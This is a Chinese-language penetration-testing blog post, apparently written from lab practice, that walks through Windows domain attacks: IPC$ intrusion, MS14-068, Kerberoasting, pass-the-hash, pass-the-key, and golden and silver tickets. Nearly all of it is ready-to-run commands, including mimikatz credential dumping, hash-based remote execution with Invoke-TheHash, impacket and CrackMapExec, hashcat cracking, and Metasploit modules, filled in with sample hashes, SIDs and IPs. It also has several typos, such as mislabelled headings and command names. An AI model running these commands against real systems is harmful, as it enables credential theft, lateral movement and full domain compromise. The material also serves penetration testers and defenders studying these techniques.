---
title: "IPC MS14068 Pth Ptt Ptk Kerberoating"
date: 2019-08-07T17:48:55+08:00
lastmod: 2019-08-07T17:48:55+08:00
draft: false
tags: [域渗透]
categories: [内网渗透]
comment: true
---
IPC MS14068 Pth Ptt Ptk Kerberoating
<!--more-->

# IPC 
## IPC$入侵
- 建立非空连接
![](https://ae01.alicdn.com/kf/H7de99dac099e4694966204a93871c634o.jpg)

- 新建批处理
 ![](https://ae01.alicdn.com/kf/H6daf7be4713d4b5c9171df8d753fbf6eK.jpg)
 
- Copy命令上传
![](https://ae01.alicdn.com/kf/Heb36bd75a778479584c35b41049f54438.jpg)

- 查看目标靶机时间
![](https://ae01.alicdn.com/kf/Haec412d7ef12423b9163b8592fd2e8fcS.jpg)

- 通过at命令在特定时间执行批处理文件
![](https://ae01.alicdn.com/kf/Hc8924d6008ba497ebe4318670297d786v.jpg)

- 在目标靶机上查看
![](https://ae01.alicdn.com/kf/H8cc8f0e34be1490dada5fe6f28dbe9b0D.jpg)

## 其他命令
- 将目标共享建立一个映射g盘
`net use g: \\192.168.3.68\c$`
![](https://ae01.alicdn.com/kf/H8cc8f0e34be1490dada5fe6f28dbe9b0D.jpg)

- 查看已建立的会话
![](https://ae01.alicdn.com/kf/H01d751f3dd924bffab1af18d1105e807t.jpg)

### 通过工具进行会话连接执行
```
psexec.exe  \\192.168.1.108   cmd  -uadministrator   -p  123456
```
```
csript.exe  wmiexec.vbs   /shell   192.168.1.108   administrator   123456
```
**返回一个cmd交互界面执行即可**


# MS14068
- 首先尝试访问域控共享文件夹
![](https://ae01.alicdn.com/kf/HTB1.IzPdL5G3KVjSZPxq6zI3XXax.jpg)
**拒绝访问**

- 使用ms16048

`-u 域账号+@+域名称`
`-p 为当前用户的密码，即 ts1 的密码`
`-s 为 ts1 的 SID 值，可以通过 whoami /all 来获取用户的 SID 值 -d 为当前域的域控`

- 生成ccache文件
![](https://ae01.alicdn.com/kf/HTB13G2TdLWG3KVjSZFPq6xaiXXa9.jpg)

- 删除当前缓存的kerboeos票据 
`kerberos::purge`
![](https://ae01.alicdn.com/kf/HTB1d2L1dRGw3KVjSZFDq6xWEpXaL.jpg)

- 导入ccache文件
`kerberos::ptc`
![](https://ae01.alicdn.com/kf/HTB1lGYVdL1G3KVjSZFkq6yK4XXap.jpg)

- 再次访问域控共享文件
![](https://ae01.alicdn.com/kf/HTB19EDHcAxz61VjSZFtq6yDSVXaD.jpg)

# Kerberoating

## 早期kerberoating

> 工具 Kerberoast工具包 Mimikatz

- 使用Kerberoast工具包GetUserPNs.ps1进行SPN扫描

![](https://ae01.alicdn.com/kf/HTB1wyjxdMmH3KVjSZKzq6z2OXXaM.jpg)

- 根据微软提供的类KerberosRequeststorSecurityToken发起Kerberos请求申请票据
`Add-Type -AssemblyName System.IdentityModel`
`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SRC_DB_ODAY.org:1433"`
![](https://ae01.alicdn.com/kf/HTB1n46CdQWE3KVjSZSyq6xocXXa0.jpg)

- 通过klist命令查看当前会话存储的Kerberos票据
`klist`
![](https://ae01.alicdn.com/kf/HTB1NyzJdHus3KVjSZKbq6xqkFXaG.jpg)

- 使用mimikatz导出
`kerberos::list /export`
![](https://ae01.alicdn.com/kf/HTB1FB3Na2Bj_uVjSZFpq6A0SXXaf.jpg)

- 使用kerberoast 工具集中的 tgsrepcrack.py 工具进行离线爆破
`python tgsrepcrack.py list1.txt 2-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi`
![](https://ae01.alicdn.com/kf/HTB16NnDdUWF3KVjSZPhq6xclXXaU.jpg)

## kerberoating新姿势

>工具 Invoke-Kerberoast.ps1 HashCat

- 转为Hashcat格式
`Invoke-kerberoast –outputformat hashcat | fl`
![](https://ae01.alicdn.com/kf/HTB13mzYdUGF3KVjSZFoq6zmpFXaB.jpg)
- 保存 
`nvoke-Kerberoast -Outputformat Hashcat | fl > test1.txt`

- Hashcat爆破
`hashcat64.exe –m 13100 test1.txt password.list --force
`![](https://ae01.alicdn.com/kf/HTB19sMbdG5s3KVjSZFNq6AD3FXa9.jpg)

# Pth
## Pass the hash
- 使用mimikatz先获取hash

```
privilege::debug
```
```
sekurlsa::logonpasswords
```
![](https://ae01.alicdn.com/kf/H5b1de26684c14fac9a0301ee533e168d3.jpg)

- 攻击机执行

```
mimikatz "privilege::debug" "sekurlsa::pth /user:Administrator /domain:SRV-DB-0DAY /ntlm:ac307fdeab3e8307c3892c163a7808d5"
```

![](https://pic1.superbed.cn/item/5d4b9eb3451253d178f061a6.jpg)

- 验证pth

![](https://pic3.superbed.cn/item/5d4b9f15451253d178f07075.jpg)

## wmiexec

- Invoke-SMBExec

```
https://github.com/Kevin-Robertson/Invoke-TheHash

Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command "calc.exe" -verbose
```
- Invoke-SMBExec

```
Invoke-SMBExec -Target 192.168.3.21 -Domain test.local -Username test1 -Hash ccef208c6485269c20db2cad21734fe7 -Command "calc.exe" -verbose
```
**如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本**

- wmiexec.py 

```
https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py

https://github.com/maaaaz/impacket-examples-windows
```
```
wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 "whoami"
```
**普通用户可用**

## CrackMapExec
```
https://github.com/byt3bl33d3r/CrackMapExec.git
```
```
crackmapexec 192.168.3.0/24 -u administrator -H ccef208c6485269c20db2cad21734fe7
```

# Ptk
> **对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash**

- 获取用户的aes key

```
mimikatz "privilege::debug" "sekurlsa::ekeys"
```
![](https://pic3.superbed.cn/item/5d4ba498451253d178f12f17.jpg)

- 注入aes key

```
mimikatz "privilege::debug" "sekurlsa::pth /user:sqlsvr /domain:0DAY.ORG /aes256:bf2cab4e27a426c9ec9d21c919f119843415ee5d98587063d6e48d16633c5436" 
```
![](https://pic.superbed.cn/item/5d4ba588451253d178f15100.jpg)

# Ptt
## Golden ticket(黄金票据)
> 前提：
> 域名称
> 域SID
> krbtgt账户密码
> 伪造用户名

- dump krbtgt hash

```
privilege::debug
lsadump::lsa /patch
```
![](https://pic.superbed.cn/item/5d4bad1c451253d178f25b74.jpg)

- 生成ticket

```
kerberos::golden  /admin:administrator  /domain:0day.org /sid: S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2  /ticket:test.kiribi
```
![](https://pic3.superbed.cn/item/5d4bba48451253d178f43e9a.jpg)

- 注入凭据

```
kerberos::ptt test.kirbi
```
![](https://pic.superbed.cn/item/5d4bc27c451253d178f576dc.jpg)
- 验证Golden ticket

![](https://pic.superbed.cn/item/5d4bc45b451253d178f5ba55.jpg)
## golden ticket（白银票据）

> 前提：
> 域名称
> 域SID
> 域的服务账户的密码hash
> 伪造用户名

- dump server hash

```
privilege::debug
sekurlsa::logonpasswords
```
![](https://pic3.superbed.cn/item/5d4bc7b5451253d178f63419.jpg)

- 导入凭证

```
kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:192.168.3.142 /rc4:74cca677f85c7c566352fd846eb0d82a  /service:cifs /user:syst1m /ptt
```

- 验证

![](https://pic.superbed.cn/item/5d4bd4a9451253d178f7fe27.jpg)

# Tips
```
mimikatz复制粘贴困难，可使用如>>log.txt
```
```
exploit/windows/smb/psexec 使用hash传递
```
```
post/windows/gather/smart_hashdump 读取hash
```
```
.domain_list_gen 获取域管理账户列表
```
```
auxiliary/gather/kerberos_enumusers 用户名枚举
```
```
auxiliary/admin/kerberos/ms14_068_kerberos_checksum 14068
```
```
load kiwi
kerberos_ticket_use /tmp/0-00000000-juan@krbtgt-DEMO.LOCAL.kirbi kiwi扩展来导入TGT票证
参考：https://blog.rapid7.com/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit/
```
- Mimikatz

```
load mimikatz 加载
mimikatz_command -f version  版本
mimikatz_command -f fu 获取可用模块列表
msv 检索msv凭证
wdigest 读取密码
kerberos 尝试检索kerberos凭据
```

看到了再加～